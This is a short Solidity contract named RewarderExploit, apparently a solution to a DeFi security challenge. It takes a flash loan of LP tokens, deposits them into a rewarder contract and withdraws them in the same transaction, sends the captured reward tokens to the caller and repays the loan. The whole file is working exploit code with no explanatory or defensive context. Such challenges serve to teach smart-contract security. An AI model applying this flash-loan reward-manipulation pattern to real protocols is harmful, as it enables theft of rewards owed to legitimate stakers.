pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IRewarder {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

interface IFlashLoanReceiver {
    function receiveFlashLoan(uint256 amount) external;
}

interface IFlashLoaner {
    function flashLoan(uint256 amount) external;
}

contract RewarderExploit is IFlashLoanReceiver{
    address owner;
    IRewarder target;
    IERC20 rewardToken;
    IERC20 lptoken;

    function exploit(address _loan, uint256 _amount, address _rewarder, address _rewardToken, address _lpToken) external {
        // Immediately deposit, and withdraw
        IFlashLoaner loan = IFlashLoaner(_loan);
        owner = msg.sender;
        target = IRewarder(_rewarder);
        rewardToken = IERC20(_rewardToken);
        lptoken = IERC20(_lpToken);
        loan.flashLoan(_amount);
    }

    function receiveFlashLoan(uint256 _amount) external override {
        lptoken.approve(address(target), _amount);
        target.deposit(_amount);
        target.withdraw(_amount);
        uint256 rewardBal = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner, rewardBal);
        lptoken.transfer(msg.sender, _amount);
    }
}